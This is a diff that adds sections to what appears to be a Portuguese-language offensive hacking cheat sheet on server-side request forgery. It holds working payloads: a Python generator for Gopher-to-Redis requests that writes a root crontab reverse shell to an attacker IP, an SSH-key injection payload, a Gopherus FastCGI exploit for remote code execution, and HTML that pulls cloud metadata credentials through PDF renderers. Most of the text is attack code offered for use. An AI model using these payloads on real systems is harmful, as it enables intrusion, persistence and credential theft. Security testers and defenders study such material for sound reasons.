@@ -1050,8 +1050,51 @@ gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$31%0d%0a<?php 
 # Injeta chave pública em /root/.ssh/authorized_keys
 gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0assh%0d%0a$48%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2E... seu-email%0a%0a%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
 ```
+#### 3. Persistência via Crontab (Root)
+
+Requer Redis rodando como root com escrita em `/var/spool/cron/`:
+
+```python
+#!/usr/bin/env python3
+# Gera payload gopher que grava tarefa agendada via Redis (comprimentos RESP exatos)
+import urllib.parse
+cmd = "\n\n* * * * * bash -i >& /dev/tcp/SEU-IP/4444 0>&1\n\n"
+parts = [
+    ["CONFIG", "SET", "dir", "/var/spool/cron/crontabs/"],
+    ["CONFIG", "SET", "dbfilename", "root"],
+    ["SET", "cron", cmd],
+    ["SAVE"],
+]
+resp = "".join(f"*{len(p)}\r\n" + "".join(f"${len(a.encode())}\r\n{a}\r\n" for a in p) for p in parts)
+print("gopher://127.0.0.1:6379/_" + urllib.parse.quote(resp))
+```
+
+> Validação: apontar o SSRF para o payload gerado, escutar com `nc -lvnp 4444`
+> e aguardar o callback (até 60s); confirmar a linha via `GET cron` no Redis.
+
+
 
 ---
+### 🧲 Protocol Smuggling via Gopher — FastCGI / PHP-FPM (Porta 9000)
+
+Se um `php-fpm` escuta em `127.0.0.1:9000` sem passar pelo web server, registros
+FastCGI forjados via Gopher invocam scripts PHP locais com `PHP_VALUE` arbitrário:
+
+```bash
+# Gerar payload com o Gopherus (mesmo fluxo do MySQL acima — módulo FastCGI)
+gopherus --exploit fastcgi
+# Informe o arquivo PHP local existente e o comando a executar
+```
+
+> O vetor clássico define `auto_prepend_file = php://input` e entrega o webshell
+> no corpo da requisição, alcançando RCE sem arquivo prévio no alvo.
+> Ver teoria em [[Essential Web Hacking]] (SSRF contra FastCGI).
+
+> Validação: a resposta reflete a saída do comando enviado; sem reflexão,
+> tratar como blind e confirmar via OOB (DNS/HTTP externo).
+
+---
+
 
 ### ☁️ Cloud Metadata Endpoints
 
@@ -1126,6 +1169,23 @@ http://alvo-confiavel.com:80@127.0.0.1/
 # Se o backend valida apenas o domínio "empresa.com", mas existe um redirect aberto lá:
 http://alvo.com/preview?url=https://empresa.com/redirect?to=http://127.0.0.1:3306
 ```
+### 🖨️ SSRF em Geradores de PDF / Renderizadores Headless
+
+Sistemas que convertem HTML em PDF (`wkhtmltopdf`, Puppeteer, WeasyPrint,
+Chrome Headless) renderizam `<iframe>`, `<img>` e `<link>` antes de gerar o documento:
+
+```html
+<iframe src="http://169.254.169.254/latest/meta-data/" height="400" width="800"></iframe>
+<img src="http://127.0.0.1:8080/admin" />
+```
+
+> O PDF gerado embute o conteúdo do destino interno.
+> Ver teoria em [[Essential Web Hacking]] (Motores Headless).
+
+> Validação: baixar o PDF e buscar strings de `meta-data`, `AccessKeyId`
+> ou do painel interno.
+
+
 
 ---
 
